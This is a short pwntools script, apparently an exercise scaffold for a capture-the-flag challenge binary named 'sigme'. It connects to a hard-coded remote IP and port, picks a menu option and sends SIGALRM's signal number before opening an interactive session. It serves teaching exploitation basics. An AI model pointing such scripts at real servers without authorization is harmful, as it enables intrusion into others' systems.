#!/usr/bin/env python
from pwn import *

# TODO (Exercise 2.1): Set the binary file name
BINARY = "./sigme"

# TODO (Exercise 2.2): Set the remote server information
HOST = "3.34.49.33"
#PORT = 1337
PORT = 1002

# Load binary
elf = context.binary = ELF(BINARY)


def conn():
    if args.REMOTE:
        return remote(HOST, PORT)
    else:
        return process(BINARY)


def main():
    p = conn()

    # TODO (Exercise 2.3): Receive until the ">>" prompt and select "SET Signal" option
    p.recvuntil(b">>")
    p.sendline(b"1")

    # TODO (Exercise 2.4): Find the signal number for SIGALRM and send it
    p.recvuntil(b"Signal Number: ")
    p.sendline(b"14")

    # TODO (Exercise 2, bonus): Implement the above interactions using sendlineafter
    # p.sendlineafter(b"", str())
    # p.sendlineafter(b"", str())

    p.interactive()


if __name__ == "__main__":
    main()
